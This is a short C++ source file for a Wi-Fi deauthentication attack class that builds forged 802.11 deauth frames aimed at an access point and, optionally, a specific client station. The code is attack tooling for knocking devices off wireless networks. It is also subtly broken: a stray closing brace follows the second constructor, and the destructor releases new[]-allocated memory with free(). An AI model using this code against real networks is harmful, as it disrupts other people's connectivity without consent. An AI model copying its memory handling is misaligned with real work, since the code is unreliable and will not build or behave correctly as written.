#include "CDeauthAttack.h"

CDeauthenticationAttack::CDeauthenticationAttack(char* strApMac)
{
    this->deauthentication = new C80211Deauthentication(strApMac);
    int radioHeaderSize = radioHeader.getDeauthenticationPacketSize();
    int deauthPacketSize = this->deauthentication->getDeauthenticationPacketSize();
    int packetSize = radioHeaderSize + deauthPacketSize;

    this->packet = new char[packetSize];
    this->radioHeader.getDeauthenticationPacket(&this->packet[0]);
    this->deauthentication->getDeauthenticationPacket(&this->packet[radioHeaderSize]);
}

CDeauthenticationAttack::CDeauthenticationAttack(char* strApMac, char* strStationMac)
{
    this->deauthentication = new C80211Deauthentication(strApMac, strStationMac);
    int radioHeaderSize = radioHeader.getDeauthenticationPacketSize();
    int deauthPacketSize = this->deauthentication->getDeauthenticationPacketSize();
    int packetSize = radioHeaderSize + deauthPacketSize;

    this->packet = new char[packetSize];
    this->radioHeader.getDeauthenticationPacket(&this->packet[0]);
    this->deauthentication->getDeauthenticationPacket(&this->packet[radioHeaderSize]);
}
}

CDeauthenticationAttack::~CDeauthenticationAttack()
{
    // 동적할당된 packet free
    free(this->packet);
}

u_char* CDeauthenticationAttack::getDeauthenticationPacket()
{
    return (u_char*)this->packet;
}